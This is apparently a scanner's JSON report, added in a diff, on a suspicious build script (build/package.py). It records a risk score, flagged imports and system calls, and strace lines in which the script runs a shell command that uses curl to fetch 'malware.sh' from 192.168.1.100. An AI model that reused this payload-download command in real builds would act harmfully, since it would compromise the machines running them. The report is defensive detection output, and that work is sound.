@@ -1,0 +1,29 @@
+{
+    "run_id": "142",
+    "package": "build/package.py",
+    "risk_probability": 0.9763720631599426,
+    "prediction": 1,
+    "file_entropy": 4.8966,
+    "execution_time": 133.74,
+    "exit_code": -9,
+    "suspicious_imports": [
+        "os",
+        "subprocess"
+    ],
+    "command_injection_calls": [
+        "system",
+        "system"
+    ],
+    "obfuscation_flags": [],
+    "system_calls_detected": [
+        "execve(\"/opt/hostedtoolcache/Python/3.11.14/x64/bin/python\", [\"python\", \"build/package.py\"], 0x7ffece3c8d30 /* 120 vars */) = 0",
+        "[pid  2342] execve(\"/bin/sh\", [\"sh\", \"-c\", \"--\", \"curl http://192.168.1.100/malwar\"...], 0x7ffe11aa5510 /* 120 vars */) = 0",
+        "[pid  2343] execve(\"/usr/bin/curl\", [\"curl\", \"http://192.168.1.100/malware.sh\"], 0x55a4f4256b38 /* 120 vars */) = 0",
+        "[pid  2343] connect(3, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1 ENOENT (No such file or directory)",
+        "[pid  2343] connect(3, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1 ENOENT (No such file or directory)",
+        "[pid  2343] connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(\"192.168.1.100\")}, 16) = -1 EINPROGRESS (Operation now in progress)",
+        "curl: (28) Failed to connect to 192.168.1.100 port 80 after 133000 ms: Couldn't connect to server"
+    ],
+    "behavior_score": 10,
+    "timestamp": "2026-02-24T01:00:15.987394"
+}
